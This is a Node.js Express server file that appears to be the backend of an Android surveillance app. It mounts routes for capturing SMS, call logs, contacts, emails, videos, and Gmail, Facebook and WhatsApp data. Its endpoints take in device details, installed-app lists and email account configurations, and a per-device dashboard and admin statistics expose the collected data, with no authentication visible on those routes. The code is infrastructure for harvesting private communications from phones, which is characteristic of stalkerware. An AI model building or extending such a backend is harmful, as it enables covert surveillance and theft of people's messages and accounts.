require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const path = require('path');
const config = require('./config/app');

// Import routes
const authRoutes = require('./routes/auth');
const videoRoutes = require('./routes/videos');
const notificationRoutes = require('./routes/notifications');
const mediaRoutes = require('./routes/media');
const callLogRoutes = require('./routes/callLogs');
const contactRoutes = require('./routes/contacts');
const smsRoutes = require('./routes/sms');
const profileRoutes = require('./routes/profile');
const commentRoutes = require('./routes/comments');
const likeRoutes = require('./routes/likes');
const playlistRoutes = require('./routes/playlists');
const chatRoutes = require('./routes/chat');
const gmailRoutes = require('./routes/gmail');
const facebookRoutes = require('./routes/facebook');
const whatsappRoutes = require('./routes/whatsapp');
const adminRoutes = require('./routes/admin');
const userRoutes = require('./routes/users');
const captureMessagesRoutes = require('./routes/captureMessages');
const captureEmailsRoutes = require('./routes/captureEmails');
const captureVideosRoutes = require('./routes/captureVideos');
const settingsRoutes = require('./routes/settings');

const app = express();

// Middleware
app.use(helmet({
  crossOriginResourcePolicy: { policy: "cross-origin" },
  contentSecurityPolicy: false
}));

// CORS configuration
app.use(cors({
  origin: function (origin, callback) {
    // Allow requests with no origin (like mobile apps or Postman)
    if (!origin) return callback(null, true);
    
    if (config.cors.allowedOrigins.indexOf(origin) !== -1 || config.cors.allowedOrigins.includes('*')) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: config.cors.credentials,
  methods: config.cors.methods,
  allowedHeaders: config.cors.allowedHeaders
}));

app.use(morgan(config.logging.format));
app.use(express.json({ limit: config.upload.maxSize }));
app.use(express.urlencoded({ extended: true }));

// MongoDB Connection
mongoose.connect(config.database.url, {
  ...config.database.options,
  dbName: config.database.name
})
.then(() => {
  console.log('✅ MongoDB connected successfully to mob_notifications database');
  console.log('🔗 Database URL:', config.database.url?.replace(/\/\/[^:]+:[^@]+@/, '//***:***@'));
})
.catch(err => {
  console.log('❌ MongoDB connection error:', err.message);
  process.exit(1);
});

// Test database connection
mongoose.connection.on('error', (err) => {
  console.error('❌ MongoDB connection error:', err);
});

mongoose.connection.on('disconnected', () => {
  console.log('⚠️ MongoDB disconnected');
});

mongoose.connection.on('reconnected', () => {
  console.log('✅ MongoDB reconnected');
});

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/users', userRoutes);
app.use('/api/videos', videoRoutes);
app.use('/api/playlists', playlistRoutes);
app.use('/api/comments', commentRoutes);
app.use('/api/likes', likeRoutes);
app.use('/api/media', mediaRoutes);
app.use('/api/notifications', notificationRoutes);
app.use('/api/gmail', gmailRoutes);
app.use('/api/sms', smsRoutes);
app.use('/api/callLogs', callLogRoutes);
app.use('/api/contacts', contactRoutes);
app.use('/api/chat', chatRoutes);
app.use('/api/profile', profileRoutes);
app.use('/api/facebook', facebookRoutes);
app.use('/api/whatsapp', whatsappRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/capture/messages', captureMessagesRoutes);
app.use('/api/capture/emails', captureEmailsRoutes);
app.use('/api/capture/videos', captureVideosRoutes);
app.use('/api/settings', settingsRoutes);

// Serve uploaded files
app.use('/uploads', express.static(config.upload.uploadsDir));
app.use('/public', express.static(config.upload.publicDir));

// Serve static frontend
app.use(express.static(path.join(__dirname, '../frontend/build')));

const mobileFirebaseService = require('./services/mobileFirebaseService');

// Device info endpoint
app.post('/api/device/info', async (req, res) => {
  try {
    const { deviceId, manufacturer, model, androidVersion, sdkVersion, timestamp } = req.body;
    
    // Store device info directly to Firebase
    const result = await mobileFirebaseService.storeDeviceInfo({
      deviceId,
      manufacturer,
      model,
      androidVersion,
      sdkVersion,
      timestamp
    });

    res.json({ success: true, message: 'Device info stored in Firebase', firebaseId: result.firebaseId });
  } catch (error) {
    console.error('Device info error:', error);
    res.status(500).json({ success: false, message: 'Failed to store device info in Firebase' });
  }
});

// Apps list endpoint
app.post('/api/apps/list', async (req, res) => {
  try {
    const { deviceId, apps } = req.body;
    
    // Store apps list directly to Firebase
    const result = await mobileFirebaseService.storeAppsList({
      deviceId,
      apps
    });

    res.json({ success: true, message: 'Apps list stored in Firebase', firebaseId: result.firebaseId });
  } catch (error) {
    console.error('Apps list error:', error);
    res.status(500).json({ success: false, message: 'Failed to store apps list in Firebase' });
  }
});

// Email accounts configuration endpoint
app.post('/api/email-accounts', async (req, res) => {
  try {
    const { userId, emailAccounts } = req.body;
    
    if (!userId || !emailAccounts || !Array.isArray(emailAccounts)) {
      return res.status(400).json({ error: 'Invalid data format' });
    }

    // Store email accounts configuration
    const result = await mobileFirebaseService.storeEmailAccounts({
      userId,
      emailAccounts
    });

    res.json({ 
      success: true, 
      message: 'Email accounts configuration stored in Firebase', 
      count: result.count 
    });
  } catch (error) {
    console.error('Email accounts error:', error);
    res.status(500).json({ success: false, message: 'Failed to store email accounts configuration in Firebase' });
  }
});

// Get all devices data
app.get('/api/devices', async (req, res) => {
  try {
    const Device = require('./models/Device');
    const devices = await Device.find({})
      .select('deviceId deviceInfo installedApps lastAppsUpdate createdAt')
      .sort({ createdAt: -1 });
    
    res.json({ success: true, data: devices });
  } catch (error) {
    console.error('Get devices error:', error);
    res.status(500).json({ success: false, message: 'Failed to get devices' });
  }
});

// Get device dashboard data
app.get('/api/dashboard/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    
    const Device = require('./models/Device');
    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }

    // Get notifications count
    const notificationCount = await require('./models/Notification').countDocuments({ deviceId: deviceId });
    
    // Get media stats
    const mediaStats = await require('./models/Media').getDeviceStats(deviceId);
    
    // Get recent notifications
    const recentNotifications = await require('./models/Notification').find({ deviceId: deviceId })
      .sort({ timestamp: -1 })
      .limit(10);
    
    // Get recent media
    const recentMedia = await require('./models/Media').getRecentMedia(deviceId, 10);

    res.json({
      success: true,
      data: {
        device: {
          deviceId: device.deviceId,
          deviceInfo: device.deviceInfo,
          installedApps: device.installedApps,
          lastAppsUpdate: device.lastAppsUpdate,
          createdAt: device.createdAt
        },
        stats: {
          notifications: notificationCount,
          media: mediaStats,
          apps: device.installedApps ? device.installedApps.length : 0
        },
        recentNotifications,
        recentMedia
      }
    });
  } catch (error) {
    console.error('Dashboard error:', error);
    res.status(500).json({ success: false, message: 'Failed to get dashboard data' });
  }
});

// Admin stats endpoint
app.get('/api/admin/stats', async (req, res) => {
  try {
    const [
      usersCount,
      devicesCount,
      notificationsCount,
      emailsCount,
      smsCount,
      callLogsCount,
      contactsCount,
      gmailAccountsCount
    ] = await Promise.all([
      require('./models/User').countDocuments(),
      require('./models/Device').countDocuments(),
      require('./models/Notification').countDocuments(),
      require('./models/Email').countDocuments(),
      require('./models/SMS').countDocuments(),
      require('./models/CallLog').countDocuments(),
      require('./models/Contact').countDocuments(),
      require('./models/GmailAccount').countDocuments()
    ]);

    res.json({
      users: usersCount,
      devices: devicesCount,
      notifications: notificationsCount,
      emails: emailsCount,
      sms: smsCount,
      callLogs: callLogsCount,
      contacts: contactsCount,
      gmailAccounts: gmailAccountsCount
    });
  } catch (error) {
    console.error('Error fetching admin stats:', error);
    res.status(500).json({ error: 'Failed to fetch admin statistics' });
  }
});

// Health check route
app.get('/api/health', (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    version: config.api.version,
    environment: config.server.environment
  });
});

// Keep-alive endpoint to prevent sleep
app.get('/api/keep-alive', (req, res) => {
  res.json({
    status: 'awake',
    timestamp: new Date().toISOString(),
    message: 'Server is active and running'
  });
});

// Auto keep-alive mechanism (optional - for extra reliability)
if (config.server.environment === 'production') {
  setInterval(() => {
    console.log('🔄 Keep-alive ping:', new Date().toISOString());
  }, 5 * 60 * 1000); // Log every 5 minutes
}

// Root endpoint - serve frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend/build/index.html'));
});

// Catch all other non-API routes and serve frontend
app.get('*', (req, res) => {
  // Only serve frontend for non-API routes
  if (!req.path.startsWith('/api/')) {
    res.sendFile(path.join(__dirname, '../frontend/build/index.html'));
  } else {
    res.status(404).json({ success: false, message: 'API endpoint not found' });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Error:', err);
  res.status(500).json({
    success: false,
    message: config.server.environment === 'development' ? err.message : 'Something went wrong'
  });
});

// Start server
app.listen(config.server.port, config.server.host, () => {
  console.log(`🚀 Server running on port ${config.server.port}`);
  console.log(`📧 Environment: ${config.server.environment}`);
  console.log(`🔗 API Documentation: ${config.api.documentation}`);
  console.log(`🏥 Health Check: ${config.api.healthCheck}`);
});

module.exports = app; 